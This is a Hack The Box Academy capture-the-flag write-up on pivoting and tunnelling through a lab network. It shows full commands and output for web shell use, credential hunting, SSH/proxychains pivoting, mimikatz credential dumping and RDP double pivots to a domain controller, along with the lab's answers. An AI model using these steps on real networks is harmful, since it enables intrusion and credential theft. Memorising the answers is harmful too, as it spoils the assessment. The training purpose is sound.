# [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)

## Skills Assessment - Pivoting, Tunneling, and Port Forwarding

> A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:
- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.

> **Note:** Keep in mind the tools and tactics you practiced throughout this module. Each one can provide a different route into the next pivot point. You may find a hop to be straightforward from one set of hosts, but that same tactic may not work to get you to the next. While completing this skills assessment, we encourage you to take proper notes, draw out a map of what you know of already, and plan out your next hop. Trying to do it on the fly will p

> Connection Info:
- `Foothold IP`: `10.129.229.129` (`ACADEMY-PIVOT-WEB01`)

Questions:
1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer. `webadmin`
2. Submit the credentials found in the user's home directory. (Format: `user:password`). `mlefay:Plain Human work!`
3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer. `172.16.5.35`
4. Use the information you gathered to pivot to the discovered host. Submit the contents of `C:\Flag.txt` as the answer. `S1ngl****************`
5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable? `vfrank`
6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the `C:\Flag.txt` located on the workstation. `N3tw0******************`
7. Submit the contents of `C:\Flag.txt` located on the Domain Controller. `3nd-0***************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 10.129.229.129 -T4

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
┌──(nabla㉿kali)-[~]
└─$ firefox http://10.129.229.129:80/ &
```

#### Foothold - Initial Access

![Firefox - Webshell Homepage](./assets/screenshots/pivoting_tunneling_and_port_forwarding_skills_assessment_01.png)

```
www-data@inlanefreight.local:…/www/html# whoami

www-data
```

#### Internal Information Gathering - Credential Hunting

```
www-data@inlanefreight.local:…/www/html# ls -la /home/

total 8
drwxr-xr-x 2 administrator administrator 4096 Feb 21  2024 administrator
drwxr-xr-x 4 webadmin      webadmin      4096 Feb 21  2024 webadmin 📌
```

```
www-data@inlanefreight.local:…/www/html# ls -la /home/webadmin

total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

```
www-data@inlanefreight.local:…/www/html# cat /home/webadmin/for-admin-eyes-only

# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work! 📌
```

```yaml
credentials:
    username: mlefay
    password: 'Plain Human work!'
    host: 10.129.229.129
    port: 3389 (RDP)
```

```
www-data@inlanefreight.local:…/www/html# cat /home/webadmin/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD
HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i id_rsa webadmin@10.129.229.129

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

[SNIP]

webadmin@inlanefreight:~$ 
```

#### Internal Information Gathering - Network Enumeration

```
webadmin@inlanefreight:~$ ifconfig | grep inet

        inet 10.129.229.129  netmask 255.255.0.0  broadcast 10.129.255.255
        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
```

```
webadmin@inlanefreight:~$ for i in $(seq 1 254); do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.412 ms 📌
```

#### Dynamic Port Forwarding with SSH and Proxychains

```
┌──(nabla㉿kali)-[~]
└─$ tail -5 /etc/proxychains.conf

# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 9050
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i id_rsa -D 9050 webadmin@10.129.229.129
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains nmap -Pn -sT -p- 172.16.5.35 -T4

[SNIP]

PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains netexec rdp 172.16.5.35 -u mlefay -p 'Plain Human work!' --local-auth

[SNIP]

RDP         172.16.5.35     3389   PIVOT-SRV01      [+] PIVOT-SRV01\mlefay:Plain Human work! (Pwn3d!)
```

#### Pivoting

```
┌──(nabla㉿kali)-[~]
└─$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /drive:shared,~/shared +clipboard
```

```
PS C:\Users\mlefay> hostname

PIVOT-SRV01
```

```
PS C:\Users\mlefay> type C:\Flag.txt

S1ngl**************** 📌
```

#### Credentials Extraction

```
PS C:\Windows\system32> C:\Users\Public\mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"

[SNIP]

Authentication Id : 0 ; 163066 (00000000:00027cfa)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 8/2/2025 3:16:22 PM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank 📌
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
```

```yaml
credentials:
    username: vfrank
    password: 'Imply wet Unmasked!'
    host: 172.16.5.35
    port: 445 (SMB)
```

#### Internal Information Gathering - Network Information

```
PS C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::9841:e140:6c4a:6b50%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::9de0:c178:7815:a271%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

```
PS C:\Windows\system32> for ($i=25; $i -lt 46; $i++){ping /n 1 172.16.6.$i | findstr "TTL"}

Reply from 172.16.6.25: bytes=32 time<1ms TTL=128
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
```

```
PS C:\Windows\system32> $tcp = New-Object Net.Sockets.TcpClient; if ($tcp.ConnectAsync("172.16.6.25", 3389).Wait(200)) { "Port 3389 is open" } else { "Port 3389 is closed" }; $tcp.Close()
```

#### Double Pivoting

```
C:\Windows\system32> mstsc.exe
```

![Remote Desktop Connection](./assets/screenshots/pivoting_tunneling_and_port_forwarding_skills_assessment_02.png)

```
PS C:\Users\vfrank> hostname

PIVOTWIN10
```

```
PS C:\Users\vfrank> type C:\Flag.txt

N3tw0****************** 📌
```

#### Internal Information Gathering - Network Information

```
PS C:\Users\vfrank> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::45e:505c:904:5184%9
   IPv4 Address. . . . . . . . . . . : 172.16.6.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::30a4:34a7:8110:9a61%4
   IPv4 Address. . . . . . . . . . . : 172.16.10.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

```
PS C:\Users\vfrank> for ($i=1; $i -lt 100; $i++){ping /n 1 172.16.10.$i | findstr "TTL"}

Reply from 172.16.10.5: bytes=32 time<1ms TTL=128
Reply from 172.16.10.25: bytes=32 time<1ms TTL=128
```

#### Internal Information Gathering - SMB Shares Enumeration

```
PS C:\Users\vfrank> net use

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           Z:        \\172.16.10.5\C$          Microsoft Windows Network
                       \\TSCLIENT\C              Microsoft Terminal Services
```

```
PS C:\Users\vfrank> dir \\172.16.10.5\C$

    Directory: \\172.16.10.5\C$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---       12/14/2020   6:43 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---         5/3/2022  10:06 AM                Users
d-----         5/3/2022  10:09 AM                Windows
-a----        5/18/2022   1:33 PM             20 Flag.txt.txt
```

```
PS C:\Users\vfrank> type \\172.16.10.5\C$\Flag.txt.txt

3nd-0*************** 📌
```

---
---

